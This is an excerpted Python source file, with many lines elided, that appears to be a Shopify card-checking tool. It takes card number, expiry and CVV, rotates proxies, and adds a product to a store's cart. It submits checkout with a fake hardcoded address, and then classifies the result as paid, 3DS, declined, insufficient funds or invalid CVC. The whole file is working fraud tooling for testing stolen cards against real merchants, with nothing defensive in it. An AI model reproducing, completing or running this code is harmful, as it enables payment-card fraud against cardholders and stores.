...
# Assuming utils.py exists in the directory
from utils import Utils, extract_between 

# Set up logging (SILENCED FOR CLEAN OUTPUT)
# logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

async def fetchProducts(domain, session=None, proxy_url=None):
    try:
        ...
        try:
            async with use_session.get(
                ...
                if resp.status == 429:
                    return False, "<b>Site Rate Limited (429)</b>"
                if resp.status == 503:
                    return False, "<b>Site Overloaded (503)</b>"
                if resp.status == 404:
                    return False, "<b>Site Error! Status: 404</b>"
                if resp.status != 200:
                ...
                try:
                    ...
                    return False, "<b>JSON Error! (Site might be password protected)</b>"
                    ...
                    async with use_session.get(
                        ...
                        timeout=aiohttp.ClientTimeout(total=20)
                         ...
                         if resp.status == 200:
                            text = await resp.text()
                            result = json.loads(text)['products']
                            if not result: return False, "<b>No Products!</b>"
                         else:
                             return False, f"<b>Site Error! Status: {resp.status}</b>"
                except Exception:
                    return False, f"<b>Connection Error!</b>"
            else:
                return False, f"<b>Connection Error!</b>"
        except asyncio.TimeoutError:
            return False, "<b>Connection Timeout</b>"
        finally:
            if close_session:
        ...
        for product in result:
            if not product.get('variants'): continue
            ...
            for variant in product['variants']:
                ...
                if fallback_product is None:
                    fallback_product = {
                        'site': domain,
                        'price': str(float(variant.get('price', '0').replace(',', ''))),
...
async def process_card(cc, mes, ano, cvv, site=None, proxy=None):
    ...
    street = "15th Streets Trailer Park Rd"
    city = "Alton"
    state = "ME"
    s_zip = "04468"
    phone = "+1 4724986979"
    ...
    try:
        ...
        if proxy:
            if '@' in proxy:
                ...
                if len(parts) == 4:
                    ...
                    ip_port, user, password = parts
                    proxy_url = f"http://{user}:{password}@{ip_port}"
                else:
                    proxy_status = "Dead (Invalid Format)"
                    proxy_url = None
            else:
            ...
            if proxy_url:
                try:
                    ping_timeout = aiohttp.ClientTimeout(total=12, connect=5)
                    async with aiohttp.ClientSession(timeout=ping_timeout, headers={'User-Agent': headers['User-Agent']}) as ping_session:
                        try:
                            async with ping_session.get("https://api.ipify.org?format=json", proxy=proxy_url, ssl=False) as resp:
                                if resp.status == 200:
                                    try:
                                        ...
                                        if 'ip' in data:
                                            ...
                                            proxy_status = "Dead (Bad Data)"
                                            proxy_url = None
                                    except:
                                        proxy_status = "Dead (Not JSON)"
                                        proxy_url = None
                                else:
                                    proxy_status = "Dead (Blocked)"
                                    proxy_url = None
                        except Exception:
                            proxy_status = "Dead (Connection Failed)"
                            proxy_url = None
                except Exception:
                    proxy_status = "Dead (Ping Error)"
                    proxy_url = None
        else:
            proxy_status = "Dead (No Proxy)"
        
        if isinstance(site, (list, tuple)):
            site_obj = random.choice(site)
        else:
            site_obj = site
            
        if hasattr(site_obj, 'url'):
            site_url = site_obj.url
            variant_id = getattr(site_obj, 'variant_id', None)
        else:
            site_url = str(site_obj)
            variant_id = None
        ...
        if not variant_id:
            connector = aiohttp.TCPConnector(ssl=ssl.create_default_context(), limit=100, limit_per_host=30, ttl_dns_cache=300, use_dns_cache=True, family=socket.AF_INET, force_close=False)
            timeout = aiohttp.ClientTimeout(total=30, connect=10)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
                info = await fetchProducts(site_url, session, proxy_url)
                
            if isinstance(info, tuple) and not info[0]:
                return False, info[1], ourl, "Unknown", "0.00", "USD", proxy_status
            elif isinstance(info, dict):
                variant_id = info.get('variant_id')
                requires_shipping = info.get('requires_shipping', True)
                product_price = info.get('price', "0.00")
                if not variant_id:
                    return False, "No variant ID found", ourl, "Unknown", "0.00", "USD", proxy_status
            else:
                return False, "Failed to fetch products", ourl, "Unknown", "0.00", "USD", proxy_status
        else:
        ...
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
            return await process_with_session(session, ourl, variant_id, requires_shipping, product_price, 
                                            headers, firstName, lastName, email, phone, street, city, state, 
                                            country, s_zip, proxy_status, proxy_url)
    
    except Exception as e:
        return False, f"Error: {str(e)}", ourl, "Unknown", "0.00", "USD", proxy_status

async def process_with_session(session, ourl, variant_id, requires_shipping, product_price, 
                              headers, firstName, lastName, email, phone, street, city, state, 
                              country, s_zip, proxy_status, proxy_url):
    try:
        delivery_strategy = ""
        ...
        stableId = ""
        merch = ""
        checkout_url = ourl + '/checkout/'
        
        subtotal = product_price
        actual_price = product_price
        shipping_amount = "0.00"
        tax_amount = "0.00"
        running_total = product_price
        currency = "USD"

        try:
            cart_resp = await session.post(ourl + '/cart/add.js', data={'id': variant_id}, headers=headers, ssl=False, proxy=proxy_url)
        except Exception as e:
            return False, "Failed to add to cart", ourl, "Unknown", "0.00", "USD", proxy_status

        try:
            response = await session.post(checkout_url, headers=headers, ssl=False, allow_redirects=False, proxy=proxy_url)
            
            if response.status in [301, 302, 303]:
                redirect_url = response.headers.get('Location', response.headers.get('location', ''))
                if redirect_url:
                    checkout_url = redirect_url
                    response = await session.get(checkout_url, headers=headers, ssl=False, proxy=proxy_url)
            ...
            return False, "Failed to get checkout", ourl, "Unknown", "0.00", "USD", proxy_status
        
        if 'login' in checkout_url.lower():
            return False, "Site requires login!", ourl, "Unknown", "0.00", "USD", proxy_status
        ...
        actual_price = extract_between(text, 'data-checkout-total-price="', '"')
        if not actual_price:
            actual_price = extract_between(text, 'data-checkout-subtotal-price="', '"')
        
        if actual_price:
            try:
                actual_price = float(actual_price.replace(',', ''))
                subtotal = f"{actual_price:.2f}"
        ...
        if not sst:
            return False, "Failed to get session token", ourl, "Unknown", "0.00", "USD", proxy_status
        ...
        try:
            ...
            if response.status == 429: return False, "Site Rate Limited (429)", ourl, "Unknown", "0.00", "USD", proxy_status
            if response.status == 503: return False, "Site Overloaded (503)", ourl, "Unknown", "0.00", "USD", proxy_status
        except Exception as e:
            if proxy_url:
                try:
                    response = await session.post(
                    ...
                    return False, "Site not supported for now!", ourl, "Unknown", "0.00", "USD", proxy_status
            else:
                return False, "Site not supported for now!", ourl, "Unknown", "0.00", "USD", proxy_status
        ...
        try:
            ...
            return False, "Failed to parse proposal", ourl, "Unknown", "0.00", "USD", proxy_status

        try:
            if 'data' in resp_json and 'session' in resp_json['data'] and 'negotiate' in resp_json['data']['session'] and 'result' in resp_json['data']['session']['negotiate']:
                result = resp_json['data']['session']['negotiate']['result']
                seller_proposal = result.get('sellerProposal', {})
                
                if 'runningTotal' in seller_proposal and 'value' in seller_proposal['runningTotal']:
                    running_total = seller_proposal['runningTotal']['value'].get('amount', running_total)
                elif 'total' in seller_proposal and 'value' in seller_proposal['total']:
                    running_total = seller_proposal['total']['value'].get('amount', running_total)
                ...
                if delivery_data.get('__typename') != 'PendingTerms':
                    ...
                    if delivery_lines:
                        avail_strats = delivery_lines[0].get('availableDeliveryStrategies', [])
                        if avail_strats:
                            delivery_strategy = avail_strats[0].get('handle', '')
                            amt = avail_strats[0].get('amount', {}).get('value', {}).get('amount', "0.00")
                            shipping_amount = str(amt)
                
                try:
                    tax_amount = seller_proposal.get('tax', {}).get('totalTaxAmount', {}).get('value', {}).get('amount', "0.00")
                except:
                    tax_amount = "0.00"

                payment_methods = seller_proposal.get('payment', {}).get('availablePaymentLines', [])
                for method in payment_methods:
                    if method.get('paymentMethod', {}).get('name'):
                        payment_identifier = method['paymentMethod'].get('paymentMethodIdentifier', 'credit_card')
                        try:
                            gateway = method['paymentMethod'].get('extensibilityDisplayName', 'Shopify')
                        except:
                            gateway = 'Shopify'
                        break
            
            if not payment_identifier: payment_identifier = "credit_card"
            if not delivery_strategy: delivery_strategy = ""
        ...
        try:
            ...
            if response.status == 429:
                return False, "Site Rate Limited (429)", ourl, "Unknown", "0.00", "USD", proxy_status
        ...
        try:
            ...
            try:
                ...
                try:
                    running_total = resp_json['data']['session']['negotiate']['result']['sellerProposal']['total']['value']['amount']
                except:
                    pass
        except:
            pass
        ...
        parsed_url = urlparse(ourl)
        scope_domain = parsed_url.netloc
        
        if not scope_domain.startswith('www.'):
            scope_domain = 'www.' + scope_domain

        token_headers = headers.copy()
        token_headers['Referer'] = ourl + '/'
        token_headers['Origin'] = f"{parsed_url.scheme}://{parsed_url.netloc}"
        ...
        payload = {
            ...
            "payment_session_scope": scope_domain
        }
        ...
        if not token:
            return False, 'Unable to get payment token', ourl, "Unknown", "0.00", "USD", proxy_status
        ...
        try:
            ...
            if proxy_url:
                try:
                    ...
                    return False, "Error processing card", ourl, "Unknown", "0.00", "USD", proxy_status
            else:
                return False, "Error processing card", ourl, "Unknown", "0.00", "USD", proxy_status
        
        # FIX: Parse JSON FIRST, then use the parsed data for string checks
        try:
            resp_json = await response.json()
        ...
        if "The requested payment method is not available." in text:
            return False, "Payment method is not shopify!", ourl, "Unknown", "0.00", "USD", proxy_status

        rid = None
        try:
            rid = resp_json['data']['submitForCompletion']['receipt']['id']
        except Exception as e:
            if 'CAPTCHA_METADATA_MISSING' in text: 
                return False, "CARD_DECLINED", ourl, "Unknown", "0.00", "USD", proxy_status
            elif 'CAPTCHA_REQUIRED' in text: 
                return False, "CARD_DECLINED", ourl, "Unknown", "0.00", "USD", proxy_status
            elif 'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE' in text: 
                return False, "Invalid Card", ourl, "Unknown", "0.00", "USD", proxy_status
            elif 'AUTHENTICATION_ERROR' in text:
                return False, "AUTHENTICATION_ERROR", ourl, "Unknown", "0.00", "USD", proxy_status
            elif 'INSUFFICIENT_FUNDS' in text:
                return False, "INSUFFICIENT_FUNDS", ourl, "Unknown", "0.00", "USD", proxy_status
        ...
        # 4th Req Poll - FIXED: Parse JSON first before any text checks
        await asyncio.sleep(5)
        ...
        for i in range(3):
            try:
                ...
                # FIX: Parse JSON FIRST - this is the main fix!
                try:
                    resp_json = await response.json()
                except:
                    resp_json = None
                
                # Convert to text for string matching AFTER parsing JSON
                text = json.dumps(resp_json) if resp_json else ""
                
                # Check for success
                if (checkout_url + '/thank_you' in text or 'Your order is confirmed' in text or 
                    'Thank you' in text or 'success' in text or 
                    '"__typename":"ProcessedReceipt"' in text or 'SUCCESS' in text):
                    return True, f"ORDER_PAID", ourl, gateway, running_total, currency, proxy_status
                
                # Check for 3DS
                if 'CompletePaymentChallenge' in text or '/stripe/authentications/' in text:
                    return True, "3DS_REQUIRED", ourl, gateway, running_total, currency, proxy_status
                
                # FIX: Now properly check for processingError since we have valid resp_json
                if resp_json:
                    try:
                        receipt_data = resp_json.get('data', {}).get('receipt', {})
                        receipt_typename = receipt_data.get('__typename', '')
                        
                        # Check for FailedReceipt with processingError
                        if receipt_typename == 'FailedReceipt':
                            processing_error = receipt_data.get('processingError', {})
                            if processing_error:
                                error_code = processing_error.get('code', 'UNKNOWN_ERROR')
                                
                                # Map error codes properly
                                error_mapping = {
                                    'CAPTCHA_REQUIRED': 'CARD_DECLINED',
                                    'CAPTCHA_METADATA_MISSING': 'CARD_DECLINED',
                                    ...
                                    'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE': 'INVALID_CVC',
                                }
                                
                                mapped_error = error_mapping.get(error_code, error_code)
                                return True, mapped_error, ourl, gateway, running_total, currency, proxy_status
                        
                        # Check for generic PaymentFailed without specific error code
                        if receipt_typename == 'FailedReceipt':
                            return True, "PAYMENT_FAILED", ourl, gateway, running_total, currency, proxy_status
                            
                    except Exception as parse_err:
                        pass
                
                # Check if still processing
                if '"__typename":"WaitingReceipt"' in text or '"__typename":"ProcessingReceipt"' in text:
                    await asyncio.sleep(5)
                    continue
                    
                # If we get here and no error was caught, break the loop
                break
                ...
                if proxy_url:
                    try:
                        ...
                        try:
                            resp_json = await response.json()
                            text = json.dumps(resp_json)
                            if '"__typename":"ProcessedReceipt"' in text or 'SUCCESS' in text:
                                return True, f"ORDER_PAID", ourl, gateway, running_total, currency, proxy_status
                            
                            # Also check for errors in fallback
                            receipt_data = resp_json.get('data', {}).get('receipt', {})
                            if receipt_data.get('__typename') == 'FailedReceipt':
                                error_code = receipt_data.get('processingError', {}).get('code', 'PAYMENT_FAILED')
                                return True, error_code, ourl, gateway, running_total, currency, proxy_status
                        except:
                            pass
                        break
                    except:
        ...
        return False, "Change Proxy or Site", ourl, gateway, running_total, currency, proxy_status
